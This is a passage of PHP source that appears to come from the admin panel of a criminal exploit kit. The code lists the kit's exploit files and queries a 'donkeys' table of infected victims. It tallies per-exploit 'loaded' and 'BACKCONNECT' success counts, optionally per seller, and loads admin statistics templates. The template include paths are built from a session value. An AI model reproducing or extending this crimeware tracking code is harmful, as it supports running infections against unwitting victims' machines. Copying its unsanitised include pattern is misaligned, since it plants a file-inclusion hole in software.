		if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
			list($name) = explode(".", $exploitsdir[$i]);
			list($id, $namee) = explode("-", $name);
			$explarray[$id] = $namee;
		}
	}
	$result = mysql_query("SELECT `exploit`, SUM(1) AS `loaded`, SUM(`status` = 'BACKCONNECT') AS `all` FROM `donkeys` WHERE `status` <> 'NOT'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " AND `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `exploit` ORDER BY `all` DESC, `loaded` DESC");
	$exploit = array();
	$exploit['exploit'] = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$exploit['exploit'][$i] = ($row['exploit'] == 0) ? "OTHER" : $explarray[$row['exploit']];
		$exploit['all'][$i] = $row['all'];
		$exploit['frags'][$i] = $row['loaded'];
		$i++;
	}


	include("./secure/templates/" . $_SESSION['language'] . "/admin_statistics.php");
}



//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
include("./secure/templates/" . $_SESSION['language'] . "/admin.php");
mysql_close();

?>